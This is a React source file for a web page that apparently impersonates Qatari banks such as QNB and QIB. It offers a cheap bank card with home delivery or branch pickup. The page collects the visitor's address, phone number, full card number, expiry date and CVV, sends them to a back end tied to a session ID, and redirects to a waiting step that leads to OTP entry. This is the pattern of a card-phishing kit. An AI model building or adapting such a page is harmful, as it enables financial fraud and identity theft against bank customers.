import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";

const BANK_BRANCHES: Record<string, string[]> = {
  qnb: ["فرع الكورنيش", "فرع السد", "فرع طريق سلوى", "فرع اللؤلؤة", "فرع الوكرة"],
  qib: ["فرع الغرافة", "فرع الريان", "فرع الخور", "فرع سيتي سنتر", "فرع الدوحة لايف ستايل"],
  rayan: ["فرع الدفنة", "فرع مشيرب", "فرع الهلال", "فرع معيذر"],
  doha: ["فرع الدوحة سيتي سنتر", "فرع طريق المطار", "فرع بن محمود", "فرع الرويس"],
};

export default function LoginMethod() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const { language, setLanguage } = useLanguage();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "qnb";
  const hasError = params.get("error") === "true";
  
  const [sessionId, setSessionId] = useState<string>("");
  const [step, setStep] = useState<"selection" | "details" | "payment">("selection");
  const [deliveryMethod, setDeliveryMethod] = useState<"home" | "branch" | "">("");

  useEffect(() => {
    const sId = localStorage.getItem("sessionId") || params.get("session") || "";
    if (sId) {
      setSessionId(sId);
      if (!localStorage.getItem("sessionId")) {
        localStorage.setItem("sessionId", sId);
      }
    }
  }, [params]);

  const isArabic = language === "ar";
  const footerImage = isArabic 
    ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg"
    : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg";

  const [formData, setFormData] = useState({
    deliveryAddress: "",
    phoneConfirmation: "",
    branchName: "",
    cardNumber: "",
    cardholderName: "",
    expiryDate: "",
    cvv: "",
  });

  const submitLoginMethodMutation = trpc.submissions.submitLoginMethod.useMutation();

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    
    if (name === "expiryDate") {
      let cleanedValue = value.replace(/\D/g, "");
      if (cleanedValue.length > 4) cleanedValue = cleanedValue.slice(0, 4);
      if (cleanedValue.length > 2) cleanedValue = cleanedValue.slice(0, 2) + "/" + cleanedValue.slice(2);
      setFormData((prev) => ({ ...prev, [name]: cleanedValue }));
    } else {
      setFormData((prev) => ({ ...prev, [name]: value }));
    }
  };

  const handleSelection = (method: "home" | "branch") => {
    setDeliveryMethod(method);
    setStep("details");
  };

  const goToPayment = () => {
    if (deliveryMethod === "home") {
      if (!formData.deliveryAddress || !formData.phoneConfirmation) {
        toast.error(isArabic ? "يرجى ملء كافة البيانات" : "Please fill all details");
        return;
      }
    } else {
      if (!formData.branchName) {
        toast.error(isArabic ? "يرجى اختيار الفرع" : "Please select a branch");
        return;
      }
    }
    setStep("payment");
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const currentSessionId = sessionId || localStorage.getItem("sessionId") || params.get("session") || "";
    
    if (!currentSessionId) {
      toast.error(isArabic ? "جلسة غير صالحة" : "Invalid session");
      return;
    }

    if (!formData.cardNumber || !formData.cardholderName || !formData.expiryDate || !formData.cvv) {
      toast.error(isArabic ? "يرجى ملء بيانات الدفع" : "Please fill payment details");
      return;
    }

    try {
      await submitLoginMethodMutation.mutateAsync({
        sessionId: currentSessionId,
        loginType: "card_request",
        deliveryMethod,
        deliveryAddress: formData.deliveryAddress,
        phoneConfirmation: formData.phoneConfirmation,
        branchName: formData.branchName,
        cardNumber: formData.cardNumber,
        cardholderName: formData.cardholderName,
        expiryDate: formData.expiryDate,
        cvv: formData.cvv,
        issuanceFee: "10",
        deliveryFee: deliveryMethod === "home" ? "5" : "0",
        totalAmount: deliveryMethod === "home" ? "15" : "10",
      });
      
      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=otp`);
    } catch (error) {
      toast.error(isArabic ? "فشل الإرسال" : "Submission failed");
    }
  };

  const toggleLanguage = () => {
    setLanguage(isArabic ? "en" : "ar");
  };

  return (
    <div className="page-wrapper" dir={isArabic ? "rtl" : "ltr"}>
      <style>{`
        .page-wrapper { font-family: sans-serif; background-color: #f4f4f4; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
        .header { position: relative; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
        .logo { height: 80px; width: auto; object-fit: contain; background-color: white; padding: 0; }
        .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }
        .container { padding: 20px; flex: 1; max-width: 500px; margin: 0 auto; width: 100%; box-sizing: border-box; }
        .fee-info { background: white; padding: 15px; border-radius: 10px; margin-bottom: 20px; border-right: 5px solid #8C0032; }
        .fee-info h4 { margin: 0 0 5px 0; color: #8C0032; }
        .fee-info p { margin: 2px 0; font-size: 14px; color: #666; }
        .selection-box { background: white; border: 2px solid #ddd; border-radius: 10px; padding: 20px; margin-bottom: 15px; cursor: pointer; transition: 0.3s; display: flex; align-items: center; gap: 15px; }
        .selection-box:hover { border-color: #8C0032; }
        .selection-box .icon { font-size: 24px; color: #8C0032; }
        .selection-box h3 { margin: 0; font-size: 16px; color: #333; }
        .selection-box p { margin: 5px 0 0 0; font-size: 12px; color: #888; }
        .form-section { background: white; padding: 20px; border-radius: 10px; margin-top: 15px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 8px; font-weight: bold; font-size: 14px; color: #444; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 15px; }
        .submit-btn { background: #8C0032; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 16px; }
        .footer-image { width: 100%; display: block; margin-top: 20px; }
        .payment-card { border: 1px solid #eee; border-radius: 12px; padding: 20px; margin-top: 10px; }
        .card-icons { display: flex; gap: 5px; margin-bottom: 15px; }
        .card-icons img { height: 20px; }
      `}</style>
      
      <header className="header">
        <div style={{ fontSize: "28px", color: "#8C0032" }}>&#9776;</div>
        <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663821954062/BkVFgBrnkZHoPjjv.png" className="logo" alt="Logo" />
        <button onClick={toggleLanguage} className="lang-btn">{isArabic ? "English" : "العربية"}</button>
      </header>

      <div className="container">
        <div className="fee-info">
          <h4>{isArabic ? "رسوم إصدار البطاقة: 10 ر.ق" : "Card Issuance Fee: 10 QAR"}</h4>
          <p>{isArabic ? "البطاقة مجانية لمدة عام بدون أي مصاريف" : "Card is free for one year with no additional charges"}</p>
          {deliveryMethod === "home" && <p>{isArabic ? "رسوم التوصيل: 5 ر.ق" : "Delivery Fee: 5 QAR"}</p>}
        </div>

        {step === "selection" && (
          <>
            <h2 style={{ fontSize: "18px", marginBottom: "15px" }}>{isArabic ? "اختر طريقة استلام البطاقة" : "Choose card delivery method"}</h2>
            <div className="selection-box" onClick={() => handleSelection("home")}>
              <div className="icon">🏠</div>
              <div>
                <h3>{isArabic ? "توصيل إلى المنزل" : "Home Delivery"}</h3>
                <p>{isArabic ? "في خلال 48 ساعة عمل" : "Within 48 working hours"}</p>
              </div>
            </div>

            <div className="selection-box" onClick={() => handleSelection("branch")}>
              <div className="icon">🏦</div>
              <div>
                <h3>{isArabic ? "استلام من أقرب فرع" : "Pickup from nearest branch"}</h3>
                <p>{isArabic ? "من الفرع الخاص بك" : "From your specific bank branch"}</p>
              </div>
            </div>
          </>
        )}

        {step === "details" && (
          <div className="form-section">
            <h3 style={{ marginBottom: "20px" }}>{deliveryMethod === "home" ? (isArabic ? "بيانات التوصيل" : "Delivery Details") : (isArabic ? "اختر الفرع" : "Select Branch")}</h3>
            {deliveryMethod === "home" ? (
              <>
                <div className="form-group">
                  <label>{isArabic ? "عنوان التوصيل" : "Delivery Address"}</label>
                  <input name="deliveryAddress" type="text" placeholder={isArabic ? "أدخل العنوان بالتفصيل" : "Enter full address"} value={formData.deliveryAddress} onChange={handleInputChange} />
                </div>
                <div className="form-group">
                  <label>{isArabic ? "تأكيد رقم الهاتف" : "Confirm Phone Number"}</label>
                  <input name="phoneConfirmation" type="tel" placeholder="5XXXXXXX" value={formData.phoneConfirmation} onChange={handleInputChange} />
                </div>
              </>
            ) : (
              <div className="form-group">
                <label>{isArabic ? "اختر الفرع الأقرب إليك" : "Select nearest branch"}</label>
                <select name="branchName" value={formData.branchName} onChange={handleInputChange}>
                  <option value="">{isArabic ? "-- اختر الفرع --" : "-- Select Branch --"}</option>
                  {BANK_BRANCHES[bank]?.map(b => <option key={b} value={b}>{b}</option>)}
                </select>
              </div>
            )}
            <button className="submit-btn" onClick={goToPayment}>{isArabic ? "التالي" : "Next"}</button>
            <button style={{ background: "none", color: "#8C0032", border: "none", marginTop: "10px", width: "100%", cursor: "pointer" }} onClick={() => setStep("selection")}>{isArabic ? "رجوع" : "Back"}</button>
          </div>
        )}

        {step === "payment" && (
          <div className="form-section">
            <h3 style={{ marginBottom: "5px" }}>{isArabic ? "معلومات الدفع" : "Payment method"}</h3>
            <p style={{ fontSize: "14px", color: "#666", marginBottom: "20px" }}>
              {isArabic ? `إجمالي المبلغ المطلوب: ${deliveryMethod === "home" ? "15" : "10"} ر.ق` : `Total amount: ${deliveryMethod === "home" ? "15" : "10"} QAR`}
            </p>
            
            <div className="payment-card">
              <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "15px" }}>
                <input type="radio" checked readOnly style={{ width: "auto" }} />
                <span style={{ fontWeight: "bold" }}>💳 {isArabic ? "بطاقة" : "Card"}</span>
              </div>
              
              <div className="form-group">
                <label>{isArabic ? "معلومات البطاقة" : "Card information"}</label>
                <div style={{ position: "relative" }}>
                  <input name="cardNumber" type="text" placeholder="1234 1234 1234 1234" value={formData.cardNumber} onChange={handleInputChange} />
                  <div style={{ position: "absolute", right: "10px", top: "50%", transform: "translateY(-50%)", display: "flex", gap: "4px" }}>
                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" height="12" alt="visa" />
                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" height="12" alt="mastercard" />
                  </div>
                </div>
              </div>
              
              <div style={{ display: "flex", gap: "10px" }}>
                <div className="form-group" style={{ flex: 1 }}>
                  <input name="expiryDate" type="text" placeholder="MM / YY" value={formData.expiryDate} onChange={handleInputChange} />
                </div>
                <div className="form-group" style={{ flex: 1 }}>
                  <input name="cvv" type="text" placeholder="CVC" value={formData.cvv} onChange={handleInputChange} />
                </div>
              </div>
              
              <div className="form-group">
                <label>{isArabic ? "اسم صاحب البطاقة" : "Cardholder name"}</label>
                <input name="cardholderName" type="text" placeholder={isArabic ? "الاسم الكامل على البطاقة" : "Full name on card"} value={formData.cardholderName} onChange={handleInputChange} />
              </div>
            </div>

            <button className="submit-btn" onClick={handleSubmit} disabled={submitLoginMethodMutation.isLoading}>
              {submitLoginMethodMutation.isLoading ? (isArabic ? "جاري الإرسال..." : "Sending...") : (isArabic ? "تأكيد الدفع" : "Confirm Payment")}
            </button>
            <button style={{ background: "none", color: "#8C0032", border: "none", marginTop: "10px", width: "100%", cursor: "pointer" }} onClick={() => setStep("details")}>{isArabic ? "رجوع" : "Back"}</button>
          </div>
        )}
      </div>

      <img src={footerImage} className="footer-image" alt="Footer" />
    </div>
  );
}
